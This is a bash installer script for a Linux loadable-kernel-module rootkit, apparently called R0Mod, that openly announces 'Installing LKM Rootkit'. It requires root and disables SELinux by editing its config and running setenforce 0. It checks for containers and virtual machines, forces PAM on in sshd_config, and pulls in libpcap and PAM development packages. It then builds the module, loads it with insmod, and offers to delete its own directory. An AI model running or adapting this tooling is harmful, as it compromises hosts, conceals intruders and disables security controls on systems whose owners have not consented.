#!/bin/bash

# Errors and Fatals
[ $(uname) != "Linux" ] &&
{
	echo "Not on a Linux system. Exiting..."
	exit
}

[ $(id -u) != 0 ] &&
{
	echo "Not root. Exiting..."
	exit
}

if [ -f /etc/selinux/config ]; then
	echo "SELinux config found on system. Checking SELinux status."
	if [[ $(cat /etc/selinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
		echo "SELinux is currently enforcing."
		read -p "To disable SELinux, then press enter to continue or ^C to exit. (Requires Reboot)"

		sed -i "s:SELINUX=enforcing:SELINUX=disabled:" /etc/selinux/config ||
		{
			echo "SELinux could not be disabled. Exiting..."
			exit
		}

		echo "SELinux disabled."
		echo "To continue with installation, then reboot and restart this installation process!"
		exit
	else
		echo "SELinux configuration is clear."
	fi

	# Check verification of reboot
	if [[ $(sestatus -v | head -n 1) == *"enabled"* ]]; then
		read -p "SELinux is still enabled. So press enter to continue attempting setenforce 0 or ^C to exit, then REBOOT."
		setenforce 0
	else
		echo "SELinux is disabled."
	fi
fi

[ ! -e /proc ] &&
{
	echo "We're in a horrible jail as /proc doesn't exist. Exiting..."
	exit
}

if [ -z "`which gcc`" ]; then
	echo "Installing GCC"

	if [ -f /usr/bin/yum ]; then
		yum install -y -q -e 0 gcc &>/dev/null
	elif [ -f /usr/bin/apt-get ]; then
		apt-get --yes --force-yes update &>/dev/null
		apt-get --yes --force-yes install gcc &>/dev/null
	elif [ -f /usr/bin/pacman ]; then
		pacman -Syy &>/dev/null
		pacman -S --noconfirm base-devel &>/dev/null
	fi
fi

[ -f /usr/bin/yum ] &&
{
	echo "Installing glibc-static"
	yum install -y -q -e 0 glibc-static
}

# Conditional Warnings
gcc tools/detect_lxc.c -o tools/detect_lxc
[[ $(tools/detect_lxc && rm tools/detect_lxc) == *"definitely in LXC"* ]] &&
{
	read -p "Warning: We're in an LXC container. Press enter to continue or ^C to exit."
}

OVZ=0
uname -r|grep 'stab' && OVZ=$(($OVZ+1))
[ -d /proc/vz ] && OVZ=$(($OVZ+1))
[ $OVZ != 0 ] &&
{
	read -p "Warning: We're in an OpenVZ container. Press enter to continue or ^C to exit."
}

[ ! -z "`which sash`"] &&
{
	read -p "Warning: A sash is installed on this box. Press enter to continue or ^C to exit."
}

[ -d /proc/vz ] &&
{
	read -p "Warning: You're attempting to install in an OpenVZ environment. Press enter to continue or ^C to exit."
}

[ -f /usr/bin/lveps ] &&
{
	read -p "Warning: You're attempting to install in a CloudLinux LVE. Press enter to continue or ^C to exit."
}

[[ $(cat /proc/scsi/scsi 2>/dev/null | grep "VBOX") == *"VBOX"* ]] && # Only seems to work on Ubuntu?
{
	read -p "Warning: You're attempting to install in a VirtualBox VM. Press enter to continue or ^C to exit."
}

# Not fatal, but still good to know
[ -d /proc/xen ] && echo "Information: You're installing in an XEN environment."

[ ! -f /etc/ssh/sshd_config ] &&
{
	echo "Information: No /etc/ssh/sshd_config exists. SSH might not be installed. Install it."
	exit
}

[ ! "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] && echo "UsePAM yes" >> /etc/ssh/sshd_config

CHATTR_OUTPUT=$(touch children; chattr +ia children &>output; cat output)
[[ $CHATTR_OUTPUT == *"Inappropriate ioctl"* ]] &&
{
	read -p "Warning: You're attempting to install on a weird/alien filesystem, This is bad. Exiting..."
	exit
}
chattr -ia children &>/dev/null
rm -f children output

install_prerequisites ()
{
	if [ -f /usr/bin/yum ]; then
		yum install -y -q -e 0 make gcc pam-devel openssl-devel newt libgcc glibc-devel glibc-devel openssl-devel libpcap libpcap-devel vim-common attr python2 &>/dev/null
	elif [ -f /usr/bin/apt-get ]; then
		apt-get --yes --force-yes &>/dev/null
		apt-get --yes --force-yes install attr libpam0g-dev libpcap-dev libssl-dev gcc-multilib build-essential python &>/dev/null
		if ! grep  -q "Debian\|Ubuntu" /etc/issue.net; then
			apt-get --yes --force-yes install libssl-dev &>/dev/null
		fi
		[ ! -z "$(apt-cache search libpcap0.8-dev)" ] && apt-get --yes --force-yes install libpcap0.8-dev &>/dev/null
		grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
	elif [ -f /usr/bin/pacman ]; then
		pacman -Syy &>/dev/null
		pacman -S --noconfirm attr pam openssl libpcap base-devel python2 &>/dev/null
	fi

	[ -z "`which python2`" ] &&
	{
		echo "Error: python2 was not found. Exiting..."
		exit
	}
}

compile ()
{
	make clean
	make all
}

install ()
{
	rmmod R0Mod
	insmod Release/R0Mod.*.ko
}

echo "Installing prerequisite packages."
install_prerequisites
echo "Packages installed!"

echo "Compiling rootkit libraries."
sleep 2
compile
echo "Rootkit libraries compiled."
sleep 2

echo "Installing LKM Rootkit."
sleep 2
install
echo "LKM Rootkit installed."
sleep 2

read -p "Would you like to automatically remove this directory (`pwd`) on exit? (YES/NO) (case-sensitive) [NO]: "
if [ -z $REPLY ]; then
	echo "Not removing `pwd`"
elif [ "$REPLY" == "YES" ]; then
	rm -rf `pwd`
elif [ "$REPLY" == "NO" ]; then
	echo "Not removing `pwd`"
else
	echo "Invalid option. Not removing."
fi

echo "Installation has finished."
exit
